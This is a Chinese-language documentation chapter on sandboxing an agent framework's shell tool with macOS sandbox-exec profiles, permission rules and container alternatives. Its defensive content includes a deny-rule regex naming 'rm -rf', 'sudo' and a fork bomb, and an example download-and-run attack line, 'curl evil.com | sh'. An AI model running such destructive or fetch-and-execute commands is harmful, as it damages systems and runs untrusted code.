# 6.2 Shell 沙箱与命令控制

> **本节你会学到**
> - Shell 的三层递进防护：PermissionEngine、`confirm_tool`、内核沙箱
> - macOS 三个 sandbox profile（`readonly` / `workspace-write` / `workspace-write-no-network`）
> - Linux 等价方案：容器、namespace、seccomp

`run_shell_command` 是 Agent 能力最强、也最危险的工具。Agentao 提供**三层递进**防护，按"越下层越贵、越严"排：

```
层 A · PermissionEngine   (每一层都应该开)
  └─ 规则允许 / 拒绝 / 问
层 B · confirm_tool        (交互场景)
  └─ 用户点击确认
层 C · macOS sandbox-exec  (默认关闭，需显式启用)
  └─ 内核级文件/网络隔离
```

A、B 在 [Part 4.5](/zh/part-4/5-tool-confirmation-ui) 与 [Part 5.4](/zh/part-5/4-permissions) 讲过。本节专注**层 C：系统级沙箱**。

## macOS sandbox-exec

macOS 自带 `sandbox-exec` 工具，内核级隔离文件写入和网络访问。Agentao 的 SandboxPolicy 在命令执行前**用它包一层**。

### 3 个内置 profile

| Profile | 能写文件 | 能联网 | 典型场景 |
|---------|---------|------|---------|
| `readonly` | ❌ | ❌ | 纯读分析、审计 |
| `workspace-write-no-network` | 仅 `_RW1` 下 | ❌ | 代码编辑（无网） |
| `workspace-write` | 仅 `_RW1` 下 | ✅ | 默认开发用 |

`_RW1` 是 sandbox profile 里声明的可写路径变量，Agentao 会传入 `workspace_root`（默认 = 项目根）。

## 启用方式

### 最小配置

在 `~/.agentao/sandbox.json` 或 `<project>/.agentao/sandbox.json`：

```json
{
  "enabled": true,
  "default_profile": "workspace-write-no-network"
}
```

重启 Agent 后，所有 `run_shell_command` 调用都会被 sandbox-exec 包一层。`sandbox-exec` 不存在（非 macOS）时沙箱**静默降级**为不启用——这可能有安全风险，见"跨平台注意"章节。

### 按命令类型选不同 profile

```json
{
  "enabled": true,
  "default_profile": "workspace-write-no-network",
  "rules": [
    {"tool": "run_shell_command", "profile": "workspace-write"}
  ]
}
```

目前 rule 匹配只按 `tool` 名字；未来版本可能支持按命令内容路由到不同 profile。

### 运行时开关

```python
from agentao.sandbox import SandboxPolicy

policy = SandboxPolicy(project_root=Path("/data/tenant-a"))
policy.set_enabled(True)
policy.set_default_profile("workspace-write-no-network")
# 传给 Agent（当前需通过 ToolRunner 注入）
```

## 自定义 profile

把你的 `.sb` 文件放在 `profiles_dir` 下：

```json
{
  "enabled": true,
  "profiles_dir": "./sandbox-profiles",
  "default_profile": "my-strict"
}
```

`./sandbox-profiles/my-strict.sb`：

```scheme
(version 1)
(deny default)
(allow process-fork)
(allow process-exec)
(allow signal (target self))

;; 只允许读项目目录
(allow file-read* (subpath (param "_RW1")))
(allow file-read* (subpath "/usr"))
(allow file-read* (subpath "/Library"))
(allow file-read* (literal "/dev/null"))

;; 只允许写一个子目录
(allow file-write* (subpath (string-append (param "_RW1") "/tmp")))

;; 不允许任何网络
(deny network*)
```

**sandbox profile 语法**：TinyScheme 的子集。参考 Apple 的 [Sandbox 文档](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/)或 macOS `/System/Library/Sandbox/Profiles/*.sb`。

## Fail-closed 语义

Agentao 的沙箱策略**严格 fail-closed**——配置有问题就拒绝执行，不会静默降级：

| 错误情形 | 行为 |
|---------|------|
| `sandbox.json` JSON 解析失败 | macOS 上触发 `SandboxMisconfiguredError`；非 macOS 不开沙箱 |
| 引用的 profile 名字找不到 | 抛 `SandboxMisconfiguredError`，命令拒绝执行 |
| `sandbox-exec` 二进制不在 PATH | 认定不支持；macOS 以外正常 |
| profile 文件语法错（Scheme 错） | 构造 SandboxPolicy 时 `profile_health_error()` 报错；健康检查器会拒绝启用 |

**含义**：生产环境 enabled=true 后，任何配置错误**都会**让 Shell 工具停摆——这是有意为之，比"无声禁用保护"好。

## 跨平台注意

| OS | sandbox-exec 可用 | 建议 |
|----|-----------------|-----|
| macOS 13+ | ✅ | 直接用 |
| Linux | ❌ | 用容器 / namespaces / seccomp（见下） |
| Windows | ❌ | WSL2 / Docker Desktop |

Linux 上**没有**内建等效。常见替代方案：

**方案 1 · 容器隔离**

把 Agent 整个跑在 Docker 容器里，挂 read-only 根文件系统 + volume 白名单：

```bash
docker run --rm \
  --read-only \
  --tmpfs /tmp \
  -v $(pwd):/workspace \
  --network=none \
  -e OPENAI_API_KEY=$OPENAI_API_KEY \
  your-agent-image
```

**方案 2 · firejail / bwrap**

用轻量级沙箱工具包住 `run_shell_command`。目前 Agentao 没有内置，需要你自定义 `ShellTool`：

```python
from agentao.tools.shell import ShellTool
import shlex

class FirejailShellTool(ShellTool):
    def execute(self, command: str, **kw) -> str:
        wrapped = ["firejail", "--private=/tmp/sb", "--"] + shlex.split(command)
        return super().execute(command=" ".join(shlex.quote(a) for a in wrapped), **kw)
```

**方案 3 · 云平台隔离**

在 gVisor / Kata Containers / AWS Lambda 等隔离性更强的环境里跑 Agent。

## 什么场景值得开沙箱

| 场景 | 开还是不开 |
|------|---------|
| 开发者本地跑 Agentao CLI | 可开可不开（开了更稳） |
| 嵌入个人 SaaS 后端（单租户） | **开** |
| 多租户 SaaS（高风险） | **开 + 容器隔离双保险** |
| 可信内部工具 | 可不开 |
| 带 LLM 的 CI | **必开**（CI 环境天然不该跑任意命令） |

## 沙箱之外：命令内容过滤

即便开了沙箱，也要在**权限引擎**层先过滤命令字符串：

```json
{
  "rules": [
    {"tool": "run_shell_command", "args": {"command": "rm\\s+-rf|sudo|:\\(\\)\\{.*:|;.*:&"}, "action": "deny"},
    {"tool": "run_shell_command", "args": {"command": "^(git|ls|cat|grep) "}, "action": "allow"},
    {"tool": "run_shell_command", "action": "ask"}
  ]
}
```

沙箱防的是"命令造成的内核级伤害"；权限防的是"命令根本不该被执行"。两层叠加才稳。

## ⚠️ 常见陷阱

::: warning 上线前先确认这几条
- ❌ **只靠沙箱不做规则过滤** —— `sandbox-exec` 是在 LLM 决定执行**之后**才拒，PermissionEngine 要在更早一层拦下
- ❌ **自定义 profile 未验证** —— `.sb` 文件里的拼写错误会让规则静默失效
- ❌ **`_RW1` 指错地方** —— 沙箱只允许写 `_RW1`，如果它不是你的 `workspace_root`，等于没法写

下面每一条都附完整修法。
:::

### ❌ 只靠沙箱不做规则过滤

沙箱能阻止 `rm -rf /` 删除系统文件，但它**阻止不了** `curl evil.com | sh` 下载恶意脚本到工作区再执行。规则层才能拦住后者。

### ❌ 自定义 profile 未验证

写完新 profile 不测就上线，一旦 TinyScheme 语法错误，所有命令直接失败。部署前手跑一次健康检查：

```python
policy = SandboxPolicy(project_root=Path.cwd())
err = policy.profile_health_error("my-strict")
assert err is None, f"Profile broken: {err}"
```

### ❌ `_RW1` 指错地方

沙箱只允许写 `_RW1`，如果你希望 Agent 能写 `/tmp/output`，要么改 profile 加白，要么改 `workspace_root`。默认 `workspace_root = project root`。

## TL;DR

- **三层按顺序**：PermissionEngine（始终启用）→ `confirm_tool`（人机交互）→ macOS `sandbox-exec`（内核级，opt-in）。
- Profile：`readonly`（审计）、`workspace-write`（开发默认）、`workspace-write-no-network`（CI / 批处理）。
- 仅 macOS 有 `sandbox-exec`：Linux 生产用容器 + seccomp + 用户命名空间。前两层（PermissionEngine + `confirm_tool`）依然适用。
- 容器内沙箱配置 mount 为只读——Agent 不能改自己的 profile。

→ [6.3 网络与 SSRF 防护](./3-network-ssrf)
